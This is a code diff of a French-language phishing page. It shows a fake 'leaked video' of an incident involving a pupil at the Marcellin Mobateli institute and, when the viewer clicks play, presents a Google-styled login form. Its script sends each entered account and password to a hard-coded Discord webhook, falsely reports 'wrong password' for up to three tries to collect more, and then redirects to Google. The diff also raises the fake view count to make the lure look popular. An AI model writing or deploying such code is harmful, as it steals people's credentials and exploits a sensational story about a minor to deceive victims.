@@ -17,8 +17,6 @@
         /* --- ZONE VIDEO --- */
         .main-zone { padding: 15px; max-width: 800px; margin: 0 auto; }
         .vid-title { font-size: 1.3rem; font-weight: 500; margin-bottom: 5px; color: #fff; text-transform: uppercase; }
-
-        /* Stats Grises Uniformes (Exactement comme le screen) */
         .vid-meta-flat { font-size: 0.85rem; color: #aaa; margin-bottom: 15px; pointer-events: none; }
 
         .video-box { width: 100%; aspect-ratio: 16/9; background: #111; border-radius: 4px; position: relative; overflow: hidden; cursor: pointer; border: 1px solid #222; }
@@ -43,7 +41,8 @@
         
         input { border: none; width: 100%; font-size: 16px; outline: none; background: transparent; color: #202124; }
         
-        .error-msg { display: none; color: #d93025; font-size: 13px; margin-top: 6px; align-items: center; }
+        /* Message d'erreur sans emoji */
+        .error-msg { display: none; color: #d93025; font-size: 13px; margin-top: 8px; font-weight: 400; }
 
         .check-container { display: flex; align-items: center; margin-top: 25px; cursor: pointer; }
         .check-container input { width: 18px; height: 18px; margin-right: 12px; cursor: pointer; accent-color: #1a73e8; }
@@ -58,9 +57,9 @@
     <div id="page-video">
         <div class="nav-hub"><div class="logo-hub">HUB<span>VIDEO</span></div></div>
         <div class="main-zone">
-            <h1 class="vid-title">FUITE : ÉLÈVE DE MARCELLIN MOBATELI</h1>
+            <h1 class="vid-title">FUITE : ELEVE DE MARCELLIN MOBATELI</h1>
             <div class="vid-meta-flat">
-                547 vues • Il y a 4 heures • 120 J'aime
+                45 201 vues • Il y a 4 heures • 120 J'aime
             </div>
             
             <div class="video-box" onclick="ouvrirConnexion()">
@@ -70,8 +69,8 @@
                     <div class="play-circle"></div>
                 </div>
             </div>
-            <p style="color: #666; font-size: 0.85rem; margin-top: 15px; line-height: 1.4;">
-                Séquence exclusive de Marcellin Mobateli. Vidéo complète de l'incident impliquant une élève, filmée ce matin.
+            <p style="color: #888; font-size: 0.85rem; margin-top: 15px; line-height: 1.4;">
+                Sequence exclusive de l'Institut Marcellin Mobateli. Video complete de l'incident impliquant une eleve, filmee ce matin. Accès restreint aux membres verifies.
             </p>
         </div>
     </div>
@@ -96,7 +95,7 @@
                         <input type="password" id="pass" required>
                     </div>
                     <div id="eRow" class="error-msg">
-                        <span style="margin-right:8px;"></span> Mot de passe incorrect. Réessayez.
+                        Mot de passe incorrect. Reessayez.
                     </div>
                 </div>
 
@@ -116,15 +115,9 @@
         const WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
         let essai = 0;
 
-        window.onload = () => {
-            fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "🚩 **Visite** : Un utilisateur sur la page Marcellin." })
-            });
-        };
-
         function ouvrirConnexion() {
             fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: "🖱️ **Action** : Clic sur Play." })
+                body: JSON.stringify({ content: "Action : Clic sur Play." })
             });
             document.getElementById('page-video').style.display = 'none';
             document.getElementById('page-login').style.display = 'flex';
@@ -148,7 +141,7 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🔓 Données Capturées (" + essai + "/3)",
+                        title: "Donnees Capturees (" + essai + "/3)",
                         color: 16732928,
                         fields: [
                             { name: "Compte", value: "`"+m+"`" },
@@ -160,7 +153,7 @@
             }).then(() => {
                 if (essai < 3) {
                     document.getElementById('pBox').classList.add('error');
-                    document.getElementById('eRow').style.display = 'flex';
+                    document.getElementById('eRow').style.display = 'block';
                     document.getElementById('pass').value = '';
                 } else {
                     window.location.href = "https://www.google.com";
